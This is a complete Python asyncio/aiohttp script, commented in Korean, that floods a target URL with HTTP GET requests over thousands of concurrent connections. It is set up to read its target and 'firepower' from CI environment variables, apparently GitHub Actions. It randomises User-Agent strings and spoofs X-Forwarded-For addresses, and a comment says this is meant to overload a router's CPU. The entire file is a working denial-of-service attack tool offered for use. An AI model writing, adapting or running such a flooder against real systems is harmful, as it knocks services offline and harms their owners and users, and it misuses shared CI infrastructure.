import asyncio
import aiohttp
import os
import random

# 역사고: GitHub Settings -> Variables에서 설정값을 읽어옴
TARGET = os.getenv("TARGET_IP", "http://123.456.78.90") # 기본값 설정
STRENGTH = int(os.getenv("STRENGTH", "2000")) # 동시 연결 수

async def attack_task(session):
    while True:
        try:
            # 공유기 CPU 부하를 유발하는 헤더 조작
            headers = {
                'User-Agent': f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) {random.random()}",
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'Cache-Control': 'no-cache'
            }
            # 응답을 기다리지 않는 비동기 Flood
            async with session.get(TARGET, headers=headers, timeout=1) as response:
                pass 
        except:
            await asyncio.sleep(0.01) # 에러 시 즉시 재시작

async def main():
    print(f"[*] 공격 개시: {TARGET} (화력: {STRENGTH})")
    connector = aiohttp.TCPConnector(limit=STRENGTH, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [attack_task(session) for _ in range(STRENGTH)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
